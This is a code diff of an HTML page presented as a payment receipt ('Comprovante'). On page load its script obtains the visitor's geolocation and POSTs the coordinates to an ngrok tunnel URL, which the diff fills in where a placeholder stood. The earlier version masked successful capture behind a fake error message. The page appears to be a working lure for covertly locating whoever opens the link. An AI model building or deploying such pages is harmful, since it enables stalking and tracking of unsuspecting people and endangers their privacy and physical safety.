@@ -1,18 +1,22 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
   <meta charset="UTF-8">
   <title>Comprovante</title>
 </head>
-<body style="background-color: antiquewhite;">
-  <h1>Comprovante</h1>
+<body style="background-color: #6B02A3">
+  <img style="display: block; margin: 0 auto;" src="img/Com.jpg" alt="Comprovante" />
 
   <script>
     // Executa automaticamente ao carregar a página
     window.addEventListener("load", () => {
+      console.log("Página carregada, tentando acessar a geolocalização...");
+      
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        console.log("Geolocalização disponível. Tentando obter a localização...");
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError, { timeout: 30000 });
       } else {
+        console.log("Geolocalização não suportada no navegador.");
         alert("Algo deu errado. Tente novamente mais tarde.");
       }
     });
@@ -21,11 +25,12 @@
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
 
+      console.log("Localização obtida:");
       console.log("Latitude: " + latitude);
       console.log("Longitude: " + longitude);
 
-      // Envia a localização para o backend
-      fetch("NGROK-SERVER/send-location", {
+      // Envia a localização para o backend (ngrok URL)
+      fetch("https://2439-2804-6950-9-67d1-287f-f39f-9cdf-cee1.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -35,18 +40,19 @@
       .then(response => response.json())
       .then(data => {
         if (data.success) {
-          alert("Algo deu errado. Tente novamente mais tarde.");
+          alert("Localização enviada com sucesso!");
         } else {
-          alert("Algo deu errado. Tente novamente mais tarde.");
+          alert("Erro ao enviar a localização. Tente novamente mais tarde.");
         }
       })
       .catch(error => {
-        console.error("Erro:", error);
+        console.error("Erro ao enviar os dados:", error);
       });
     }
 
     function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+    console.error("Erro ao obter a localização:", error); // Log do erro completo
+    alert("Erro ao obter a localização. Código do erro: " + error.code + ". Mensagem: " + error.message);
     }
   </script>
 </body>
